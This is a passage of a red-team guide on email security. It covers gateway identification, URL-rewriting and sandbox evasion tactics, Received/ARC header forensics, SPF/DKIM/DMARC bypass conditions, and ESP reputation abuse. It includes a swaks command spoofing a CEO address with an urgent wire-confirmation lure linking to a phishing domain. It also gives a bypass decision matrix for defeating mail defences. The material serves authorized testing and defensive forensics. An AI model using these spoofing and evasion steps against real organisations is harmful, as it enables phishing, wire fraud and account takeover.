# Email Security Deep — Mail Infrastructure Evasion, MTA Chain Analysis & Mailbox Takeover

> Companion to `SKILL.md`, `payloads.md`, and the two sibling guides
> (`email-security-deep-playbook.md` and `email-security-deep-deep-dive.md`).
>
> **Authorization**: Every technique in this guide assumes lawful authorization — a signed Statement of Work naming target recipients, sender identities, test window, capture scope, and data-handling requirements. Mail infrastructure evasion against third-party gateways (Proofpoint, Mimecast, Cisco ESA, Microsoft Defender for Office) without written scope is computer fraud in most jurisdictions (US CFAA, UK Computer Misuse Act, EU equivalents). The placeholder convention uses `<phish-domain>`, `<vps_ip>`, `<target.com>`, `<victim@target.com>`, and `REPLACE_WITH_YOUR_X` for any secret material — never hard-code real credentials.

---

## Introduction and Objective

The two sibling guides cover the **campaign-operations** angle: `email-security-deep-playbook.md` walks an end-to-end authorized phishing operation; `email-security-deep-deep-dive.md` is the AiTM campaign emulation lab manual. This third guide is **orthogonal**. It covers the layers *underneath* and *after* the campaign:

- **Mail-gateway evasion internals** — what each gateway actually inspects, and the specific transformations (URL rewriting, sandbox detonation, sender reputation scoring) that must be defeated for a payload to reach the inbox
- **MTA chain forensics** — the `Received:` header trail, ARC chain semantics, and the precise conditions under which SPF/DKIM/DMARC alignment can be broken by forwarding, replay, or signature stripping
- **Bulk-email infrastructure** — reputation gaming against shared sending pools (SendGrid, Mailgun, SES) and dedicated-IP warm-up arithmetic
- **AiTM refinements** — combining `email-security-deep` infrastructure with `email-protocol-attack` primitives (custom `Received:` chains, multi-hop MX abuse) to make AiTM lures harder to attribute
- **Mailbox takeover post-exploitation** — Outlook Rules, Mail-Flow (transport) Rules, OAuth grants, and Inbox-Rule persistence, the techniques attackers use *after* a session-cookie replays successfully
- **Modern attachment techniques** — HTML smuggling, MHTML abuse, RTF `objupdate`, and the CVE-2024-21413 MonikerLink primitive

### Why this guide exists

Modern email defense is layered: the gateway rewrites URLs, detonates attachments, scores sender reputation, and enforces DMARC — and even after the gateway, the SSO layer (Azure AD) applies Conditional Access, CAE, and FIDO2. Attackers who want to land a payload and convert it to a foothold must defeat **each** layer, and the forensic artifacts they leave (`Received:` chain, ARC headers, OAuth audit logs) tell the defender exactly which layer failed. This guide teaches both:

1. How to chain bypasses against each layer in a controlled lab
2. How to read the resulting forensic artifacts when investigating a real incident

### What you will learn

By the end of this guide you will be able to:

- Identify each target gateway (Proofpoint EV / Microsoft 365 EOP / Mimecast / Cisco ESA) from a single probe mail's headers
- Bypass URL-rewriting / sandbox-detonation / sender-reputation controls by selecting the correct technique per layer
- Forensically reconstruct the MTA chain of a suspicious mail from `Received:` and ARC headers
- Explain precisely when SPF/DKIM/DMARC fail (forwarding, signature stripping, replay, third-party ESP alignment gaps) and how to weaponize or detect each
- Operate bulk-email infrastructure (SendGrid/Mailgun/SES) with proper reputation hygiene — and identify when it is being abused
- Detect and author Outlook Rules / Mail-Flow Rules / OAuth grants as persistence after a successful AiTM session replay
- Reproduce CVE-2024-21413 MonikerLink and HTML smuggling in a lab and write detection rules for both

### Differentiation from the sibling guides

| Topic | Playbook | Deep Dive | This Guide |
|-------|----------|-----------|------------|
| AiTM phishlet authoring | step-by-step | full lab | AiTM + protocol-level chain abuse (refinement) |
| Gateway bypass | one section per gateway (proof points) | not covered | gateway internals + bypass decision matrix |
| `Received:` / ARC forensics | not covered | not covered | full chapter |
| ESP reputation gaming | not covered | not covered | full chapter |
| Mailbox takeover (Outlook/Mail-Flow Rules, OAuth) | not covered | not covered | full chapter |
| Modern attachment primitives (HTML smuggling, MonikerLink) | mentioned briefly | one exercise | full chapter with CVE walk-through |
| DMARC report analysis | mentioned in payloads.md | not covered | Defender-side analysis chapter |

### Prerequisites

- Completion of (or familiarity with) the deep-dive AiTM lab — this guide assumes you can already stand up evilginx2 + gophish
- A Linux workstation with Kali 2025-2 (or equivalent) — `swaks`, `mailspoof`, `spfscan`, `python3`, `dig`, `openssl` are all in apt
- A target M365 Developer tenant (or equivalent mail infra you control) for forensic exercises
- 6-8 hours of focused lab time

### Scope of this guide

**In scope**: gateway internals and bypass decision matrices, `Received:` / ARC forensics, ESP reputation gaming, AiTM protocol-level refinement, mailbox-takeover post-exploitation, modern attachment primitives (HTML smuggling, MHTML, RTF `objupdate`, CVE-2024-21413).

**Out of scope** (covered elsewhere): protocol-level SMTP forgery fundamentals (`skills/email-protocol-attack/`), pretext design (`skills/social-engineering/`), payload craft post-execution (`skills/payload-generation/`), endpoint evasion (`skills/av-edr-evasion/`), cloud-identity post-exploitation at depth (`skills/cloud-identity-attack/`).

---

## Lab Architecture Overview

This lab extends the deep-dive's architecture with three new components: a forensic workstation for `Received:` / ARC analysis, an ESP simulator (containerized SendGrid-compatible API), and a mailbox-takeover target.

```
                  +-----------------------------+
                  |  Microsoft 365 Dev Tenant    |
                  |  (with E5 trial — EOP +      |
                  |   Defender for Office)       |
                  +--------------+--------------+
                                 |
                       (probe + campaign mail)
                                 |
                                 v
   +-----------------------------------------------------------+
   |  Your VPS — <phish-domain>                                 |
   |                                                            |
   |  +------------+   +--------------+   +------------------+  |
   |  | gophish    |   | evilginx2    |   | ESP simulator    |  |
   |  | :3333      |   | :443 (AiTM)  |   | (containerized)  |  |
   |  +-----+------+   +------+-------+   +--------+---------+  |
   |        |                 |                    |            |
   |        v                 v                    v            |
   |  +-----+------+   +------+------+   +---------+----------+ |
   |  | postfix    |   | sessions DB |   | reputation DB      | |
   |  | (port 25,  |   | (sqlite)    |   | (per-IP/per-domain)||
   |  |  587)      |   +-------------+   +--------------------+ |
   |  +------------+                                            |
   +-----------------------------------------------------------+
                                 |
                                 v
   +-----------------------------------------------------------+
   |  Forensic Workstation (Kali)                              |
   |  - swaks, mailspoof, spfscan, checkdmarc                  |
   |  - Python scripts for Received: / ARC parsing             |
   |  - Mailbox-takeover lab (EXO PowerShell + Graph Explorer) |
   +-----------------------------------------------------------+
```

The three new flows this lab adds:

1. **Gateway identification**: send a probe mail, parse the `Received:` chain and gateway-injected headers
2. **ESP simulation**: stand up a minimal SendGrid-compatible API to test reputation hygiene without burning a real ESP account
3. **Mailbox takeover**: after a successful session replay (from the deep-dive lab), exercise each persistence primitive

---

## Lab Setup

This section gives you a reproducible environment. The existing deep-dive lab covers evilginx2 + gophish; this lab adds the ESP simulator and the forensic workstation tooling.

### Docker Compose Stack

```yaml
# /opt/email-evasion-lab/docker-compose.yml
version: "3.9"

services:
  postfix:
    image: mwader/postfix-relay-or-smtp-server:latest
    container_name: evasion-postfix
    environment:
      - POSTFIX_MYDOMAIN=<phish-domain>
      - POSTFIX_HOSTNAME=mail.<phish-domain>
    ports:
      - "25:25"
      - "587:587"
    volumes:
      - ./postfix/main.cf:/etc/postfix/main.cf:ro
      - ./postfix/transport:/etc/postfix/transport:ro
      - ./postfix-dkim:/etc/dkimkeys:ro
    restart: unless-stopped

  opendkim:
    image: linuxserver/opendkim:latest
    container_name: evasion-opendkim
    environment:
      - PUID=1000
      - PGID=1000
      - DOMAIN=<phish-domain>
      - SELECTOR=mail
    volumes:
      - ./postfix-dkim:/etc/opendkim/keys:rw
    restart: unless-stopped

  esp-sim:
    build: ./esp-sim
    container_name: evasion-esp-sim
    environment:
      - API_KEY=REPLACE_WITH_YOUR_ESP_SIM_KEY
      - REPUTATION_DB=/data/reputation.sqlite
    ports:
      - "8081:8080"   # SendGrid v3-compatible REST API
    volumes:
      - ./esp-sim-data:/data
    restart: unless-stopped

  mailhog:
    image: mailhog/mailhog:latest
    container_name: evasion-mailhog
    ports:
      - "8025:8025"   # web UI
      - "1025:1025"   # SMTP
    restart: unless-stopped
```

### ESP Simulator Skeleton

The ESP simulator is a tiny FastAPI app exposing a SendGrid v3-compatible `/v3/mail/send` endpoint with a reputation scoring layer. It exists so you can test reputation hygiene without burning a real ESP account.

```python
# /opt/email-evasion-lab/esp-sim/app.py
from fastapi import FastAPI, Header, HTTPException, Body
from pydantic import BaseModel
import sqlite3, time, os, smtplib
from email.mime.text import MIMEText

API_KEY = os.environ.get("API_KEY", "REPLACE_WITH_YOUR_ESP_SIM_KEY")
DB = os.environ.get("REPUTATION_DB", "/data/reputation.sqlite")
DOWNSTREAM_MX = os.environ.get("DOWNSTREAM_MX", "mailhog:1025")

app = FastAPI()

def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("""create table if not exists reputation (
        sending_ip text, domain text,
        delivered integer, bounced integer, complained integer,
        spam_trap_hits integer, last_updated real,
        primary key (sending_ip, domain))""")
    conn.commit()

def score(ip, domain):
    """Return a reputation score 0-100; >= 50 delivers, < 20 rejects, else defers."""
    conn = sqlite3.connect(DB)
    row = conn.execute(
        "select delivered, bounced, complained, spam_trap_hits from reputation "
        "where sending_ip=? and domain=?", (ip, domain)).fetchone()
    if not row:
        return 100  # cold IP gets benefit of the doubt for warm-up
    delivered, bounced, complained, trap = row
    if delivered + bounced == 0:
        return 100
    bounce_rate = bounced / (delivered + bounced)
    complaint_rate = complained / max(delivered, 1)
    if complaint_rate > 0.001 or bounce_rate > 0.05 or trap > 0:
        return 10
    if bounce_rate > 0.02:
        return 40
    return 100

def record(ip, domain, event):
    conn = sqlite3.connect(DB)
    row = conn.execute(
        "select delivered, bounced, complained, spam_trap_hits from reputation "
        "where sending_ip=? and domain=?", (ip, domain)).fetchone()
    if row:
        d, b, c, t = row
        d += 1 if event == "delivered" else 0
        b += 1 if event == "bounced" else 0
        c += 1 if event == "complained" else 0
        t += 1 if event == "trap" else 0
        conn.execute("update reputation set delivered=?, bounced=?, complained=?, "
                     "spam_trap_hits=?, last_updated=? where sending_ip=? and domain=?",
                     (d, b, c, t, time.time(), ip, domain))
    else:
        conn.execute("insert into reputation values (?,?,?,?,?,?,?)",
                     (ip, domain,
                      1 if event == "delivered" else 0,
                      1 if event == "bounced" else 0,
                      1 if event == "complained" else 0,
                      1 if event == "trap" else 0,
                      time.time()))
    conn.commit()

class MailSend(BaseModel):
    personalizations: list
    from_: dict = Body(..., alias="from")
    subject: str = ""
    content: list = []

@app.post("/v3/mail/send")
def mail_send(authorization: str = Header(None), body: dict = Body(...)):
    if authorization != f"Bearer {API_KEY}":
        raise HTTPException(401, "invalid api key")
    sender_domain = body["from"]["email"].split("@")[-1]
    sending_ip = "198.51.100.10"  # your ESP-sim sending IP
    s = score(sending_ip, sender_domain)
    if s < 20:
        record(sending_ip, sender_domain, "bounced")
        raise HTTPException(422, "reputation too low — rejected")
    # Build the message and relay to downstream MX (mailhog for the lab)
    to_addr = body["personalizations"][0]["to"][0]["email"]
    msg = MIMEText(body["content"][0]["value"], "html")
    msg["Subject"] = body.get("subject", "(no subject)")
    msg["From"] = body["from"]["email"]
    msg["To"] = to_addr
    try:
        with smtplib.SMTP(DOWNSTREAM_MX, 1025) as s:
            s.send_message(msg)
        record(sending_ip, sender_domain, "delivered")
        return {"status": "queued"}
    except Exception:
        record(sending_ip, sender_domain, "bounced")
        raise HTTPException(500, "downstream error")

@app.on_event("startup")
def startup():
    init_db()
```

### Bringing the Lab Up

```bash
cd /opt/email-evasion-lab
docker compose up -d
docker compose ps   # all four containers should be "running"

# Probe mailhog at http://localhost:8025 — this is where the ESP-sim delivers

# Probe the ESP-sim
curl -s http://localhost:8081/v3/mail/send \
  -H "Authorization: Bearer REPLACE_WITH_YOUR_ESP_SIM_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "personalizations":[{"to":[{"email":"victim@<phish-domain>"}]}],
    "from":{"email":"sender@<phish-domain>"},
    "subject":"esp-sim probe",
    "content":[{"type":"text/plain","value":"probe"}]
  }'
# Expect {"status":"queued"}; check mailhog for delivered mail
```

### Forensic Workstation Tooling

On the Kali workstation:

```bash
# Core tools (most are pre-installed on Kali 2025-2)
sudo apt update
sudo apt install -y swaks postfix opendkim-tools dnsutils python3-pip \
    libemail-outlook-message-perl poppler-utils

# Python helpers
pip3 install --user checkdmarc dkimpy authheaders mail-parser publicsuffix2

# Tools referenced in the skill
pip3 install --user mailspoof
# swaks is shipped in Kali; if missing:
# sudo apt install -y swaks

# Optional: a permissive SPF scanner
pip3 install --user spfscan

# Verify
swaks --version | head -1
checkdmarc --version
python3 -c "import dkim; print('dkimpy ok')"
```

---

## Gateway Internals and Per-Layer Evasion

This chapter covers what each major gateway actually inspects and the specific bypass techniques that work against each. The sibling guides cover gateway bypass at the *campaign* level; here we go into the gateway's internals.

### Identifying the Target's Gateway

Send a probe mail and inspect the headers received at the probe mailbox. Each gateway injects specific `X-` headers.

```bash
# Send the probe
swaks --to probe@<target.com> \
      --from probe@<phish-domain> \
      --server mail.<target.com>:25 \
      --header "Subject: probe $(date +%s)" \
      --body "ignore — lab probe"

# On the probe mailbox side, save the raw message:
#   In Thunderbird: View → Message Source → Save As...
#   In OWA:    New → ... → view message headers
#   In Gmail:  Show original → Download original
```

The injected headers identify the gateway:

```text
X-Proofpoint-Spam-Details:    rule=...   → Proofpoint EV
X-Proofpoint-ORIG-From:       ...
Authentication-Results:       proofpoint.com; ...

X-Mimecast-BE-Content-...:    ...        → Mimecast
X-MC-PE-Score:                ...
MIMECAST-Authentication-Results: ...

X-IronPort-Auth:              ...        → Cisco ESA (IronPort)
X-ASG-Tag-...:                ...
IronPort-PDEF:                ...

X-MS-Exchange-Organization-...           → Microsoft Defender for Office
  (X-MS-Exchange-Organization-SCL: 5)    → Spam Confidence Level
  (X-MS-Exchange-Organization-AuthAs:    → Authentication passthrough state
     Anonymous/Internal)
Authentication-Results:       spf=... dkim=... dmarc=...
```

### Gateway Bypass Decision Matrix

Each gateway layer has a corresponding bypass technique. Use this matrix to pick the right one.

| Gateway Layer | What It Checks | Bypass Technique | Where Covered |
|---------------|----------------|------------------|---------------|
| **Inbound reputation** (all gateways) | Sender IP history, domain age, DMARC alignment | ESP relay (Mailgun/SendGrid/SES) for trusted pool; warm-up dedicated IP; align SPF/DKIM/DMARC | Reputation chapter below |
| **URL rewriting** (Proofpoint URL Defense, Defender Safe Links, Mimecast URL expansion) | Landing URL against click-time reputation feeds | Delayed activation (URL benign at scan-time, malicious at click-time); look-alike domain that survives rewrite; redirector chain that rewrites at click-time | URL Rewriting Internals section |
| **Attachment sandbox** (Cisco ESA, Defender Safe Attachments, Mimecast) | Detonates attachment in VM, observes behavior | Encrypted-zip (password out-of-band); HTML smuggling; file-type allowlist abuse (.iso, .img, .jnlp) | Modern Attachment Techniques chapter |
| **Content / NLP scoring** (all gateways) | Spam phrases, brand mismatch, language anomaly | Avoid spam phrases; consistent branding; plain-text fallback; vary templates per recipient | payloads.md Section 6-9 |
| **Sender authentication** (SPF/DKIM/DMARC) | IP/domain/key alignment | Look-alike domain (no real-brand spoof) OR forwarding path that strips signatures OR legitimate-ESP-aligned spoof of a vendor | MTA Chain Forensics chapter |
| **Behavioral / anomaly** (Defender for Office ZAP, Mimecast BEC detection) | Reply-chain insertion, sender-impersonation, executive-name match | Match the executive's typical phrasing; use a long reply chain; reply instead of new thread | Out of scope for this guide |

### URL Rewriting Internals

URL rewriters (Proofpoint URL Defense, Defender Safe Links, Mimecast URL expansion) replace the URL in the mail body with a per-recipient encoded URL that resolves through the gateway's proxy at click-time. The gateway then re-scores the destination URL against fresh threat intel. This defeats the "benign at delivery, malicious at click" technique only if the gateway re-scores *every* click.

#### Proofpoint URL Defense Rewrite Format

```text
Original:   https://login.<phish-domain>/reset?id=abc123
Rewritten:  https://urldefense.proofpoint.com/v2/url?u=https-3A__login.<phish-2D>domain_reset-3Fid-3Dabc123&d=DwMFaQ&c=...
            &s=...
```

The encoding scheme is documented:

- `-3A` = `:`
- `-2D` = `-`
- `-5F` = `_`
- `-3F` = `?`
- `-3D` = `=`

When the user clicks, Proofpoint decodes, re-scores, and either redirects or blocks. For an authorized test, the bypass techniques are:

1. **Delayed activation** — the destination serves benign content for the first N hours, then switches. If the gateway re-scans at click-time, this fails. If the gateway caches the first scan result, this succeeds. Most modern gateways re-scan at click-time.
2. **Look-alike domain** — the URL itself is on a look-alike domain (`micros0ft-login.com`) that is not yet on any blocklist at delivery time. Even with click-time re-scoring, a brand-new domain is unlikely to be listed.
3. **Redirector chain** — the URL goes through a redirector (legitimate shortener or a Caddy instance you control) that maps to different destinations over time.
4. **Encoding tricks** — some URL rewriters normalize URLs inconsistently; `https://login.micros0ft-login.com%2Freset` may decode differently at rewrite vs. at click.

```python
# /opt/email-evasion-lab/scripts/proofpoint-decoder.py
# Decodes a Proofpoint URL Defense rewrite to reveal the original URL
import sys, re

DECODE_MAP = {
    "-3A": ":", "-2D": "-", "-5F": "_", "-3F": "?", "-3D": "=",
    "-26": "&", "-2F": "/", "-40": "@", "-24": "$", "-21": "!",
    "-5E": "^", "-7E": "~", "-2A": "*", "-2E": ".", "-2C": ",",
    "-3B": ";", "-28": "(", "-29": ")",
}

def decode_pp(url):
    if "urldefense.proofpoint.com/v2/url" not in url:
        return url
    m = re.search(r"[?&]u=([^&]+)", url)
    if not m:
        return url
    enc = m.group(1)
    for k, v in DECODE_MAP.items():
        enc = enc.replace(k, v)
    return enc

if __name__ == "__main__":
    print(decode_pp(sys.argv[1]))
```

```bash
# Usage
python3 /opt/email-evasion-lab/scripts/proofpoint-decoder.py \
  "https://urldefense.proofpoint.com/v2/url?u=https-3A__login.micros0ft-2Dlogin.com_reset-3Fid-3Dabc123&d=DwMFaQ&c=..."
# Output: https://login.micros0ft-login.com/reset?id=abc123
```

#### Defender Safe Links Rewrite Format

```text
Original:   https://login.<phish-domain>/reset
Rewritten:  https://nam03.safelinks.protection.outlook.com/?url=https%3A%2F%2Flogin.<phish-domain>%2Freset&data=...&reserved=0
```

Defender URL-encodes the original URL and stores it in the `url` query parameter. At click-time, the safelinks host decodes and re-scores. The bypass techniques are the same as for Proofpoint.

#### Mimecast URL Expansion

Mimecast expands URLs in-place (no rewrite) and may sandbox the destination at scan-time. The "scan-time only" behavior makes it more vulnerable to delayed-activation than Proofpoint/Defender.

### Sandbox Bypass Internals

Sandboxes (Cisco ESA, Defender Safe Attachments, Mimecast) detonate attachments in a VM and observe behavior for N seconds. If the attachment does something malicious within the observation window, it's quarantined.

#### Sandbox Evasion Techniques

| Technique | Why It Works |
|-----------|--------------|
| **Encrypted-zip** (password out-of-band) | Sandbox cannot unzip without the password |
| **HTML smuggling** | Gateway sees only HTML/JS; the malicious binary is reconstructed client-side in the victim's browser |
| **MHTML abuse** | MHTML is an old format that wraps HTML + attachments; some sandboxes do not parse it |
| **RTF `objupdate`** | RTF's `objupdate` linkage triggers remote-fetch behavior the sandbox may not follow |
| **File-type allowlist abuse** (`.iso`, `.img`, `.vhd`, `.jnlp`) | Some sandboxes only detonate a fixed list of types |
| **Delayed execution** (`Sleep()` calls, idle loop) | Sandbox's observation window expires before action |
| **Mouse / keyboard interaction check** | Sandbox does not move the mouse; payload exits if no movement detected |
| **VM artifact detection** (registry keys, MAC OUIs, CPU feature bits) | Sandbox VMs have detectable fingerprints |

The first four are the ones that bypass the gateway layer specifically. The last three are endpoint-evasion techniques (covered in `skills/av-edr-evasion/`).

---

## MTA Chain Forensics

Every mail server that handles a message inserts a `Received:` header at the top of the message. Reading the chain in order reveals the exact path the mail took. This chapter teaches you to read the chain both offensively (to understand what the gateway sees) and defensively (to reconstruct an incident).

### The `Received:` Header Grammar

```text
Received: from <sending-hostname> (<reverse-dns> [<connecting-ip>])
        by <receiving-hostname> (<software>) with <protocol>
        id <message-id>
        for <envelope-recipient>;
        <rfc-5322-date>
```

Example real-world chain (a mail flowing from a sender on a home ISP through their MX, through a forwarder, to a corporate tenant):

```text
Received: from mailhub.target.com (mailhub.target.com [198.51.100.20])
        by smtp-in.target.com (Postfix) with ESMTP id ABC123
        for <victim@target.com>;
        Fri, 27 Jun 2026 14:02:17 +0000 (UTC)
Received: from forwarder.forward-svc.net (forwarder.forward-svc.net [203.0.113.45])
        by mailhub.target.com (Postfix) with ESMTP id DEF456
        for <victim@target.com>;
        Fri, 27 Jun 2026 14:02:15 +0000 (UTC)
Received: from mail-sender.home-isp.net (mail-sender.home-isp.net [192.0.2.99])
        by forwarder.forward-svc.net (Postfix) with ESMTP id GHI789
        for <victim@alias.target.com>;
        Fri, 27 Jun 2026 14:02:10 +0000 (UTC)
```

Reading top-down (newest at top, oldest at bottom): the mail went `home-isp.net` → `forward-svc.net` (which rewrote the recipient from `alias@target.com` to `victim@target.com`) → `mailhub.target.com` → `smtp-in.target.com` → victim's mailbox.

### Forgeries in the `Received:` Chain

Forging `Received:` headers is trivial — they are just text prepended to the message. The only `Received:` header you can trust is the one injected by **your own** mail server (the bottom-most in the chain on receipt). Older forged headers are above it.

#### Forgery Pattern: Forged Internal Hop

An attacker may prepend forged `Received:` headers to make a mail look like it originated internally:

```text
Received: from internal-mail.target.com ([10.10.1.5])
        by smtp-in.target.com (Postfix) with ESMTP id FORGED-001
        for <victim@target.com>;
        Fri, 27 Jun 2026 14:02:00 +0000 (UTC)         <-- FORGED
Received: from mail.attacker.com ([203.0.113.99])
        by smtp-in.target.com (Postfix) with ESMTP id REAL-001
        for <victim@target.com>;
        Fri, 27 Jun 2026 14:01:55 +0000 (UTC)         <-- REAL (your server's)
```

The defender's rule: **the bottom-most `Received:` header from your own infrastructure is the only one you fully trust**. Everything above it is hop-attestable but not hop-verifiable unless ARC is in play.

### ARC (Authenticated Received Chain) Internals

ARC (RFC 8617) is the standard for preserving authentication results across forwarding. It has three headers per hop:

```text
ARC-Authentication-Results: i=1; mx.google.com;
       spf=pass (sender IP is 192.0.2.99) smtp.mailfrom=sender@home-isp.net;
       dkim=pass header.d=home-isp.net header.s=mail header.b=XXXXXXX;
       dmarc=pass (p=none dis=none) header.from=home-isp.net
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
       d=forward-svc.net; s=mail; t=1770000000;
       bh=...; b=...
       h=From:To:Subject:Date:Message-ID;
ARC-Seal: i=1; a=rsa-sha256; d=forward-svc.net; s=mail; t=...;
       cv=none; b=...
```

- `ARC-Authentication-Results` records the SPF/DKIM/DMARC state at the *incoming* hop
- `ARC-Message-Signature` signs the message body and selected headers (so tampering is detectable)
- `ARC-Seal` signs the chain-so-far, with `cv` (chain validation) equal to `none` for the first hop, `pass` if the previous hop's seal verified

Each subsequent intermediary adds its own set (`i=2`, `i=3`, ...). The final receiver looks at the **outermost** `cv=`:

- `cv=pass` — the entire chain back to the originator is cryptographically intact
- `cv=fail` — at least one hop's seal does not verify; treat the chain as untrusted
- `cv=none` — only one hop (the originator); nothing to chain

### ARC Chain Weaknesses

ARC is opt-in: a receiver can ignore it entirely. And ARC only attests to *what each hop saw* — if the originator was malicious, ARC preserves "yes, this was malicious at hop 1, and the chain is intact" which does not help. The specific weaknesses attackers exploit:

1. **ARC chain stripping**: a forwarder that does not implement ARC will pass the mail without adding any `ARC-*` headers. The receiver's DMARC check then runs against the forwarder's envelope, not the originator's. If the forwarder's SPF/DKIM/DMARC passes (because the forwarder is a legitimate relay), the mail is delivered.
2. **Trusted-arc-seal abuse**: some receivers trust ARC seals from specific forwarders (Google, Microsoft, major ESPs). If an attacker can route mail through a trusted forwarder (e.g., by signing up for a Google Workspace account on a look-alike domain), the trusted seal can carry spoofed mail past the receiver's DMARC.
3. **`cv=none` acceptance**: a receiver may accept a chain with `cv=none` at a high `i=` value (i.e., a long chain with no seal verification), which is meaningless.

### Forensic Parser Script

```python
# /opt/email-evasion-lab/scripts/received-parser.py
# Parse a saved email file (.eml) and reconstruct the MTA chain.
import sys, email, re, hashlib
from email.utils import parsedate_to_datetime

def parse_eml(path):
    with open(path, "rb") as f:
        msg = email.message_from_binary_file(f)
    received = msg.get_all("Received", [])
    arc_aar = msg.get_all("ARC-Authentication-Results", [])
    arc_ams = msg.get_all("ARC-Message-Signature", [])
    arc_as  = msg.get_all("ARC-Seal", [])
    ares = msg.get("Authentication-Results", "")

    print(f"=== Authentication-Results (final hop) ===\n{ares}\n")
    print(f"=== Received chain ({len(received)} hops, top=newest) ===")
    for i, h in enumerate(received):
        # Extract connecting IP and receiving host
        m = re.search(r"from\s+(\S+)\s*\(([^)]+)\)\s+by\s+(\S+)", h)
        if m:
            print(f"  hop {i}: from {m.group(1)} ({m.group(2)}) by {m.group(3)}")
        # Extract 'for' envelope recipient
        m = re.search(r"for\s+<([^>]+)>", h)
        if m:
            print(f"          envelope-recipient: {m.group(1)}")
    print(f"\n=== ARC chain ({len(arc_as)} seals) ===")
    for s in arc_as:
        cv = re.search(r"cv=(\w+)", s)
        i  = re.search(r"i=(\d+)", s)
        d  = re.search(r"d=(\S+)", s)
        print(f"  i={i.group(1) if i else '?'} "
              f"d={d.group(1) if d else '?'} "
              f"cv={cv.group(1) if cv else '?'}")
    if arc_aar:
        print(f"\n=== ARC auth results at first hop ===\n{arc_aar[0]}")

if __name__ == "__main__":
    parse_eml(sys.argv[1])
```

```bash
# Usage against a saved mail
python3 /opt/email-evasion-lab/scripts/received-parser.py suspicious.eml
```

### SPF / DKIM / DMARC Bypass via Replay and Chaining

This section is the bridge between `email-protocol-attack` (protocol fundamentals) and `email-security-deep` (campaign ops). It enumerates the *specific* conditions under which each authentication layer fails.

#### SPF Bypass Conditions

SPF (`v=spf1 ...`) authorizes sending IPs for a domain. SPF fails when:

1. **Forwarding**: a forwarder's IP is not in the original sender's SPF. Solution: forwarder rewrites the envelope (SRS, Sender Rewriting Scheme) so SPF passes against the forwarder's domain.
2. **Mailing-list explosion**: a mailing list rewrites the From header but keeps the envelope sender; SPF may pass or fail depending on configuration.
3. **`p=none` or missing DMARC**: even if SPF fails, if DMARC policy is `p=none`, the receiver still delivers (to spam folder at worst).
4. **Look-alike domain with aligned SPF**: the attacker's look-alike domain has SPF that authorizes the attacker's IP. SPF "passes" but the user sees a different domain.

The lab demonstrates (3) — the most common real-world failure:

```bash
# Spoofable subdomain check (this is what attackers scan for)
# A domain is "spoofable" if DMARC is p=none or missing AND SPF is not enforced
for d in target.com sub1.target.com sub2.target.com; do
  dmarc=$(dig +short TXT _dmarc.$d | grep -oi 'p=[a-z]*' | head -1)
  spf=$(dig +short TXT $d | grep -i 'v=spf1')
  echo "$d  DMARC=${dmarc:-missing}  SPF=${spf:-missing}"
done

# Sample output:
#   target.com        DMARC=p=reject  SPF=v=spf1 include:_spf.google.com -all
#   sub1.target.com   DMARC=missing   SPF=missing       <-- orphaned subdomain, SPOOFABLE
#   sub2.target.com   DMARC=missing   SPF=v=spf1 ip4:198.51.100.10 ~all
```

#### DKIM Bypass Conditions

DKIM (RFC 6376) signs selected headers and the body with a private key; the receiver fetches the public key from DNS. DKIM fails when:

1. **Signature stripping**: a forwarder modifies the body or a signed header, invalidating the signature. The signature then does not verify, but the receiver typically treats this as "neutral" not "fail".
2. **Selector retirement**: the sender rotated their DKIM key and removed the old selector from DNS. The signature cannot verify. Some receivers treat this as fail, others as neutral.
3. **`l=` body length tag abuse**: a DKIM signature with `l=100` signs only the first 100 bytes of the body. An attacker can append malicious content after byte 100 and the signature still verifies. Modern receivers ignore `l=` or treat its presence with suspicion.
4. **Multiple-signature confusion**: if a mail has two DKIM signatures (one legitimate, one forged), some receivers verify the forged one and skip the legitimate one.
5. **Replay**: a captured legitimate DKIM-signed mail can be replayed to a third party. The signature still verifies. DMARC `d=` alignment prevents this from being useful only if the receiver enforces DMARC strictly.

#### DMARC Bypass Conditions

DMARC (RFC 7489) ties SPF/DKIM to the `From:` header (alignment) and specifies a policy (`p=none|quarantine|reject`). DMARC fails to enforce when:

1. **`p=none`** — explicit monitoring mode; mail always delivered regardless of auth result.
2. **`p=quarantine` with a permissive receiver** — receiver may deliver to inbox with a "external" tag rather than to spam.
3. **Subdomain without policy inheritance** — DMARC does not inherit from organizational domain. `marketing.target.com` with no `_dmarc.marketing.target.com` record is not protected by `_dmarc.target.com p=reject`. (DMARC `sp=` subdomain policy exists but is widely misconfigured.)
4. **Misaligned third-party ESP** — if the sender uses Mailgun to send `from=target.com` without configuring DMARC alignment, DMARC fails for the legitimate mail, training the receiver to treat `target.com` mail as untrusted. Attackers exploit this by spoofing during the same window.

#### ARC Bypass Conditions (Already covered)

See ARC Chain Weaknesses earlier in this chapter.

### Weaponizing Authentication Bypass (Authorized Only)

For an authorized red-team test, the chain is:

1. Identify spoofable subdomain (DMARC missing, SPF missing or `~all`)
2. Send via swaks with envelope and header From set to the spoofable identity
3. Confirm delivery to inbox (not spam)
4. Report to client as a finding

```bash
#Spoof via a subdomain that lacks DMARC and SPF enforcement
swaks --to victim@target.com \
      --from ceo@sub1.target.com \
      --server mail.target.com:25 \
      --header "From: CEO <ceo@sub1.target.com>" \
      --header "Subject: wire confirmation — urgent" \
      --body "please confirm wire instructions: https://lookup.<phish-domain>/wire"
```

If the receiving gateway accepts and delivers, the finding is: "sub1.target.com lacks DMARC and SPF enforcement — spoofable as CEO, mail reaches victim inbox."

---

## Bulk Email Infrastructure — ESP Reputation Gaming

This chapter covers the abuse patterns against shared sending pools (SendGrid, Mailgun, SES) and the legitimate reputation hygiene practices that defenders can verify an ESP is following. Attackers use ESP accounts to bypass IP-reputation controls — SendGrid and Mailgun IPs are highly trusted by every gateway.

### Why Attackers Abuse ESPs

A new IP on a dedicated VPS has cold reputation — most gateways throttle or defer mail from it. A new account on SendGrid inherits the reputation of SendGrid's shared sending pool, which is warmed-up and trusted. A single SendGrid account can send thousands of mails per day from IPs that gateways accept without question.

### The ESP Abuse Lifecycle

1. **Account creation**: attacker registers a SendGrid/Mailgun/SES account with stolen or synthetic identity
2. **Domain verification**: attacker verifies a look-alike domain they control (DNS TXT record or DNS CNAME)
3. **Single-API-key sending**: from a single API key, the attacker sends to a purchased or scraped recipient list
4. **Reputation decay**: as recipients mark the mail as spam, the ESP account's reputation drops
5. **Account suspension**: at a reputation threshold, the ESP suspends the account
6. **Re-registration**: attacker registers a new account with a new identity and domain

